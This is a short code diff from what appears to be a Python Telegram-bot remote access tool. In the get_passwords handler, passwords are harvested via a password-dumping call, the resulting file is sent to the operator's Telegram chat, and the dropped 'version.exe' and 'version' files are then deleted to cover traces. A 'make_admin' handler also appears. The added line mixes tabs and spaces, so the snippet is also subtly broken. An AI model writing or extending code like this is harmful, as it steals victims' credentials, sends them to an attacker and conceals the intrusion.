@@ -57,7 +57,8 @@ async def get_passwords(message: types.message):
 	pid, output, error, failed = net.User.passwords()
 	pswd = io.open("version", "rb", buffering=0)
 	await bot.send_document(chat_id=message["chat"]["id"], document=pswd.read())
-	os.remove("version")
+	os.remove("version.exe")
+        os.remove("version")
 
 @dp.message_handler(commands=["add_user"])
 async def make_admin(message: types.message):
